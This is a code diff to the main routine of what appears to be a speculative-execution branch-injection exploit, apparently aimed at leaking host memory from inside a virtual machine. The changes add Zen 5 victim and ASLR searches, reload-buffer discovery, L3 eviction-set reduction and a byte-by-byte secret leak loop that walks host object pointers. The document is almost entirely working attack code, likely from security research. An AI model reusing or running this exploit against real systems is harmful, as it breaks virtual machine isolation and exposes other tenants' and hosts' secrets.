     UarfJitaCtxt jita_train_stage_2 = uarf_jita_init();
+    UarfJitaCtxt jita_train_rb_find = uarf_jita_init();
+    UarfJitaCtxt jita_train_rax_leak = uarf_jita_init();
 
     uarf_jita_push_psnip(&jita_src, &psnip_src);
     uarf_jita_push_psnip(&jita_victim_dst, &psnip_victim_dst);
     uarf_jita_push_psnip(&jita_signal_hpet_dst, &psnip_hpet_signal_dst);
-    uarf_jita_push_psnip(&jita_train_stage_2, &psnip_train_stage_2);
     uarf_jita_push_psnip(&jita_train_stage_1, &psnip_train_stage_1);
+    uarf_jita_push_psnip(&jita_train_stage_2, &psnip_train_stage_2);
+    uarf_jita_push_psnip(&jita_train_rb_find, &psnip_victim_dst);
+    uarf_jita_push_psnip(&jita_train_rax_leak, &psnip_victim_dst);
 
     uarf_jita_allocate(&jita_src, &stub_src, _ul(HVA_SRC - call_offset + aslr_offset));
     uarf_jita_allocate(&jita_victim_dst, &stub_victim_dst, _ul(HVA_VICTIM_DST));
     uarf_jita_allocate(&jita_signal_hpet_dst, &stub_signal_hpet_dst,
                        HVA_DST_HPET + aslr_offset);
     uarf_jita_allocate(&jita_train_stage_1, &stub_train_stage_1,
-                       _ul(HVA_DST_STAGE_1 + aslr_offset));
+                       HVA_DST_STAGE_1 + aslr_offset);
     uarf_jita_allocate(&jita_train_stage_2, &stub_train_stage_2,
-                       _ul(HVA_DST_STAGE_2 + aslr_offset));
+                       HVA_DST_STAGE_2 + aslr_offset);
+    uarf_jita_allocate(&jita_train_rax_leak, &stub_train_rax_leak,
+                       HVA_DST_RAX_LEAK + aslr_offset);
+    uarf_jita_allocate(&jita_train_rb_find, &stub_train_rb_find,
+                       HVA_DST_RB_FIND + aslr_offset);
 
     uint64_t entry_offset = ((uint64_t) psnip_src_entry_label) - psnip_src.addr;
-    uint64_t entry_point = stub_src.addr + entry_offset;
-    uint64_t extra_call = stub_src.addr;
-
-    dst_victim_ptr[1] = _ul(stub_victim_dst.addr);
-    dst_victim_ptr[2] = 0;
-
-    dst_train_ptr[1] = _ul(stub_train_stage_1.addr);
-    dst_train_ptr[2] = _ul(stub_train_stage_2.addr);
-    dummy_val[GADGET_OFFSET_0 >> 3] = _ul(dummy_val);
 
     actxt_t ctxt = {
-        .entry_point = entry_point,
-        .extra_call = extra_call,
+        .entry_point = stub_src.addr + entry_offset,
         .stage_2_addr = stub_train_stage_2.addr,
+        .victim_call_src = HVA_SRC + aslr_offset,
 #ifndef NO_MMIO
         .mmio = mmio,
 #endif
@@ -803,6 +984,8 @@ int main(int argc, char const *argv[]) {
 #ifdef DEBUG_HIT
     UARF_LOG_INFO("Check Hit\n");
 #endif
+    dst_ptr[1] = _ul(stub_victim_dst.addr);
+    dst_ptr[2] = 0;
     rb_reset();
     for (size_t i = 0; i < ROUNDS; i++) {
         trigger_ibpb();
@@ -813,15 +996,13 @@ int main(int argc, char const *argv[]) {
 
         rb_flush();
         uarf_mfence();
+
         // Value gets passed to RDX register of victim branch
         uint8_t *reload_ptr = _ptr(RB_PTR + RB_OFFSET + RB_ENTRY * RB_STRIDE);
-
         asm volatile("victim_label:\n"
-                     "clflush (%1)\n\t"
-                     "call *%4\n\t"
+                     "call *%3\n\t"
                      :
-                     : "d"(reload_ptr), "a"(dst_victim_ptr), "b"(0), "c"(extra_call),
-                       "r"(entry_point)
+                     : "a"(dst_ptr), "b"(0), "d"(reload_ptr), "r"(ctxt.entry_point)
                      : "r8", "memory");
 
         for (volatile size_t i = 0; i < 10000; i++) {
@@ -834,7 +1015,7 @@ int main(int argc, char const *argv[]) {
     printf("rb: %s, [%lu]: %lu\n", gen_rb_heat(), maxi, rb_hist[maxi]);
 #endif
     if (maxi != RB_ENTRY || rb_hist[RB_ENTRY] < ROUNDS / 2) {
-        UARF_LOG_ERROR("not hitting it right\n");
+        UARF_LOG_ERROR("Not hitting it right\n");
         return 1;
     }
 #ifdef DEBUG_HIT
@@ -843,6 +1024,7 @@ int main(int argc, char const *argv[]) {
 #endif
 
     // search for the reload buffer
+    dst_ptr[1] = _ul(stub_train_rb_find.addr);
     uint64_t rb_hva = 0;
     printf("\n");
     printf("### search reload buffer ###");
@@ -850,24 +1032,23 @@ int main(int argc, char const *argv[]) {
     clock_t start_rb = clock();
     uint64_t rb_hva_test = 0x700000000000ul;
     if (aslr_offset == 0) {
-        rb_hva_test = 0x7ff000000000ul;
+        rb_hva_test = 0x7ffd00000000ul;
     }
     if (rb_hint) {
         rb_hva_test = rb_hint - 0x100000000ul;
     }
     for (; rb_hva_test < 0x800000000000ul; rb_hva_test += PAGE_2M) {
-        if ((rb_hva_test) % ((1 << 18) * PAGE_2M) == 0) {
+        if ((rb_hva_test) % ((1 << 10) * PAGE_1G) == 0) {
             printf("\nsearch at 0x%012lx: ", rb_hva_test);
             fflush(stdout);
         }
-        if ((rb_hva_test) % ((1 << 12) * PAGE_2M * 2) == 0) {
+        if ((rb_hva_test) % ((1 << 5) * PAGE_1G) == 0) {
             printf(".");
             fflush(stdout);
         }
-        if (attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET - GADGET_OFFSET_0,
-                        RB_ENTRY) |
-            attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET - GADGET_OFFSET_0,
-                        RB_ENTRY)) {
+        if (attack_loop(&ctxt, RB_INITIAL_ROUNDS, 0, 0, rb_hva_test + RB_OFFSET, RB_ENTRY,
+                        1) &&
+            attack_loop(&ctxt, ROUNDS, 1, 0, rb_hva_test + RB_OFFSET, RB_ENTRY, 1)) {
             rb_hva = rb_hva_test;
             printf("\nbuffer at 0x%012lx", rb_hva);
             break;
@@ -886,23 +1067,75 @@ int main(int argc, char const *argv[]) {
     fflush(stdout);
 #endif
 
+#ifdef MARCH_ZEN5
+    clock_t start_aslr_2 = clock();
+    dst_ptr[1] = _ul(stub_train_rax_leak.addr);
     printf("\n");
-    printf("### L3 eviction sets ###\n");
-    printf("build: ");
-    clock_t start_l3 = clock();
-    volatile uint64_t *dummy_set[L2_EVICTION_SIZE] = {0};
-    for (uint64_t i = 0; i < L2_EVICTION_SIZE; ++i) {
-        dummy_set[i] = (volatile uint64_t *) (_ul(mem) + (i << 12));
+    printf("### finish victim search on Zen 5 ###");
+    int64_t found_extra_offset = -1;
+    for (int64_t extra_offset = 0; extra_offset < (1UL << 45);
+         extra_offset += (1UL << 24)) {
+        uint64_t victim_guess = ctxt.victim_call_src + extra_offset;
+        if ((extra_offset) % ((1 << 20) * PAGE_2M) == 0) {
+            printf("\nsearch at 0x%012lx: ", victim_guess);
+            fflush(stdout);
+        }
+        if ((extra_offset) % ((1 << 14) * PAGE_2M * 2) == 0) {
+            printf(".");
+            fflush(stdout);
+        }
+        if (attack_loop(&ctxt, ROUNDS, 1, 0,
+                        rb_hva + RB_ENTRY * RB_STRIDE + RB_OFFSET -
+                            (victim_guess + 0x116f35f) - 0x10,
+                        RB_ENTRY, 1)) {
+            printf("\nvictim found at 0x%012lx", victim_guess);
+            found_extra_offset = extra_offset;
+            break;
+        }
     }
-    uint64_t baseline = measure_self_eviction(dummy_set);
-    if (!build_l2_sets(_ul(mem), baseline, l2_sets)) {
-        UARF_LOG_ERROR("Failed to build L3 eviction sets!\n");
+    printf("\n");
+    if (found_extra_offset < 0) {
+        UARF_LOG_ERROR("Failed to find victim extra offset\n");
         return 1;
     }
 
-    uint64_t secret_ptr_hva = rb_hva;
-    uint64_t secret_ptr_gva = RB_PTR;
-    *(volatile uint64_t *) (secret_ptr_gva) = 0;
+    // we need to relocate the source and training gadgets
+    uarf_jita_deallocate(&jita_src, &stub_src);
+    uarf_jita_deallocate(&jita_train_stage_1, &stub_train_stage_1);
+    uarf_jita_deallocate(&jita_train_stage_2, &stub_train_stage_2);
+
+    aslr_offset += found_extra_offset;
+    uarf_jita_allocate(&jita_src, &stub_src, _ul(HVA_SRC - call_offset + aslr_offset));
+    uarf_jita_allocate(&jita_train_stage_1, &stub_train_stage_1,
+                       HVA_DST_STAGE_1 + aslr_offset);
+    uarf_jita_allocate(&jita_train_stage_2, &stub_train_stage_2,
+                       HVA_DST_STAGE_2 + aslr_offset);
+
+    ctxt.entry_point = stub_src.addr + entry_offset;
+    ctxt.stage_2_addr = stub_train_stage_2.addr;
+    ctxt.victim_call_src = HVA_SRC + aslr_offset;
+    trigger_ibpb(); // make sure that we clean the slate before going on
+    clock_t end_aslr_2 = clock();
+
+#ifdef MARCH_ZEN5
+    code_aslr_time += ((double) (end_aslr_2 - start_aslr_2)) / CLOCKS_PER_SEC;
+    printf("code_aslr time = %fs\n", code_aslr_time);
+#endif
+#endif
+
+    dst_ptr[1] = _ul(stub_train_stage_1.addr);
+    dst_ptr[2] = _ul(stub_train_stage_2.addr);
+    printf("\n");
+    printf("### L3 eviction sets ###\n");
+    volatile uint64_t *(*l2_sets)[L2_1GB_SET_SIZE] =
+        calloc(L2_SETS * L2_1GB_SET_SIZE, sizeof(l2_sets[0][0]));
+    clock_t start_l3 = clock();
+    uint64_t baseline = EVICTION_BASELINE;
+    printf("build: ");
+    if (!build_l2_sets(_ul(mem), MEM_SIZE, baseline, l2_sets)) {
+        UARF_LOG_ERROR("Failed to build L3 eviction sets!\n");
+        return 1;
+    }
 
     clock_t end_l3 = clock();
 #ifndef DEMO
@@ -911,24 +1144,83 @@ int main(int argc, char const *argv[]) {
 #endif
 
     clock_t start_search = clock();
-    int found_set = 0;
-    for (int i = 0; i < 8 && !found_set; ++i) {
+    volatile uint64_t **best_eviction_set = NULL;
+    uint64_t best_eviction_set_size = SIZE_MAX;
+    for (int i = 0; i < 8 && best_eviction_set_size > L3_SET_SIZE; ++i) {
         for (int l2_set = 0; l2_set < L2_SETS; ++l2_set) {
             ctxt.eviction_set = &l2_sets[l2_set][0];
             ctxt.eviction_set_size = L2_1GB_SET_SIZE;
+            if (check_good_l3set(&ctxt, ROUNDS, 0) ||
+                check_good_l3set(&ctxt, ROUNDS, 0)) {
+                printf("optimizing set: %d\n", l2_set);
+#ifdef REDUCE_L3
+                // can we reduce the LLC eviction set?
+                volatile uint64_t *l3_wip_1[L2_1GB_SET_SIZE];
+                volatile uint64_t *l3_wip_2[L2_1GB_SET_SIZE];
+                volatile uint64_t **l3_wip = l3_wip_1;
+                volatile uint64_t **l3_replace = l3_wip_2;
 
-            if (check_byte_thresh(&ctxt, secret_ptr_hva, ROUNDS, 0) |
-                check_byte_thresh(&ctxt, secret_ptr_hva, ROUNDS, 0)) {
-                printf("selected set: %d\n", l2_set);
-                found_set = 1;
+                // start with the full big L2 set
+                uint64_t set_size = L2_1GB_SET_SIZE;
+                memcpy(l3_wip, &l2_sets[l2_set][0],
+                       L2_1GB_SET_SIZE * sizeof(l3_wip_1[0]));
+
+                // try to reduce the set
+                uint64_t reducer = REDUCE_CHUNK;
+                for (int retries = 0; retries < 8 && set_size > L3_SET_SIZE; ++retries) {
+                    for (int remove_index = 0;
+                         remove_index < set_size && set_size > L3_SET_SIZE;
+                         remove_index += reducer) {
+                        // first, remove an element from the set
+                        set_remove(l3_replace, l3_wip, set_size, remove_index);
+                        for (int i = 1; i < reducer; ++i) {
+                            set_remove(l3_replace, l3_replace, set_size - i,
+                                       remove_index);
+                        }
+
+                        // check if we still have L3 eviction
+                        ctxt.eviction_set = l3_replace;
+                        ctxt.eviction_set_size = set_size - reducer;
+                        if (check_good_l3set(&ctxt, 2 * ROUNDS, 3 * ROUNDS / 4) &&
+                            check_good_l3set(&ctxt, 2 * ROUNDS, 3 * ROUNDS / 4)) {
+                            // we still have eviction so the removal was ok. apply it.
+                            volatile uint64_t **tmp = l3_wip;
+                            l3_wip = l3_replace;
+                            l3_replace = tmp;
+                            set_size -= reducer;
+                            remove_index -= reducer;
+                            if (set_size == 128) {
+                                reducer = 1;
+                            }
+                        }
+                    }
+                }
+                printf("reached set size: %ld\n", set_size);
+                if (set_size < best_eviction_set_size) {
+                    best_eviction_set = l3_wip;
+                    best_eviction_set_size = set_size;
+                }
+#else
+                best_eviction_set = ctxt.eviction_set;
+                best_eviction_set_size = ctxt.eviction_set_size;
                 break;
+#endif
             }
         }
     }
-    if (!found_set) {
+    if (!best_eviction_set) {
         UARF_LOG_ERROR("Eviction set not found!\n");
         return 1;
     }
+    printf("final eviction set size: %ld\n", best_eviction_set_size);
+#ifdef REDUCE_L3
+    if (best_eviction_set_size > L3_SET_SIZE) {
+        UARF_LOG_WARNING("Failed to find effective set\n");
+    }
+#endif
+    ctxt.eviction_set = best_eviction_set;
+    ctxt.eviction_set_size = best_eviction_set_size;
+
     clock_t end_search = clock();
 #ifndef DEMO
     printf("l3_search time = %fs\n",
@@ -937,36 +1229,40 @@ int main(int argc, char const *argv[]) {
 #endif
 
 #ifdef DEBUG_LEAK
-    printf("leak bytes for secret=0-256:\n");
-    int success = 0;
-    int kinda_success = 0;
-    for (uint8_t s = 0; s < 256; ++s) {
-        *(volatile uint8_t *) (secret_ptr_gva) = s;
-        uarf_mfence();
+    {
+        uint64_t secret_ptr_hva = rb_hva;
+        uint64_t secret_ptr_gva = RB_PTR;
+        printf("leak bytes for secret=0-256:\n");
+        int success = 0;
+        int kinda_success = 0;
+        for (uint8_t s = 0; s < 256; ++s) {
+            *(volatile uint8_t *) (secret_ptr_gva) = s;
+            uarf_mfence();
 
-        uint8_t res;
-        if (!leak_byte(&ctxt, secret_ptr_hva, &res))
-            printf("failed\n");
-        if (res == s) {
-            success += 1;
-        }
-        else {
-            if (res >> 3 == s >> 3) {
-                printf("small-bad: %d - %d\n", s, res);
-                kinda_success += 1;
+            uint8_t res;
+            if (!leak_byte(&ctxt, secret_ptr_hva, &res))
+                printf("failed\n");
+            if (res == s) {
+                success += 1;
             }
             else {
-                printf("big-bad: %d - %d\n", s, res);
+                if (res >> 3 == s >> 3) {
+                    printf("small-bad: %d - %d\n", s, res);
+                    kinda_success += 1;
+                }
+                else {
+                    printf("big-bad: %d - %d\n", s, res);
+                }
             }
+            printf("s: %d - %u (%s)\n", s, res, s == res ? "ok" : "BAD");
+            if (s == 255)
+                break;
         }
-        printf("s: %d - %u (%s)\n", s, res, s == res ? "ok" : "BAD");
-        if (s == 255)
-            break;
+        printf("success count = %d\n", success);
+        printf("kinda_success count = %d\n", kinda_success);
+        fflush(stdout);
+        return 0;
     }
-    printf("success count = %d\n", success);
-    printf("kinda_success count = %d\n", kinda_success);
-    fflush(stdout);
-    return 0;
 #endif
     // 1. get root object pointer $root (0x5eabae986040)
     // 2. get root_table pointer at $root + 0x10 (0x5eabae986050) $root_table
@@ -1054,11 +1350,7 @@ int main(int argc, char const *argv[]) {
     clock_t start_leak_array = clock();
     for (uint64_t secret_offset = 0; secret_offset < rawlen; ++secret_offset) {
         uint64_t secret_ptr = rawdata_ptr + secret_offset;
-        uint8_t res;
-        for (int i = 0; i < 128 && !(res = leak_byte(&ctxt, secret_ptr,
-                                                     &leaked_secret[secret_offset]));
-             ++i)
-            ;
+        uint8_t res = leak_byte(&ctxt, secret_ptr, &leaked_secret[secret_offset]);
         if (res) {
             uint8_t byte = leaked_secret[secret_offset];
             if (isprint(byte) && byte < 127)
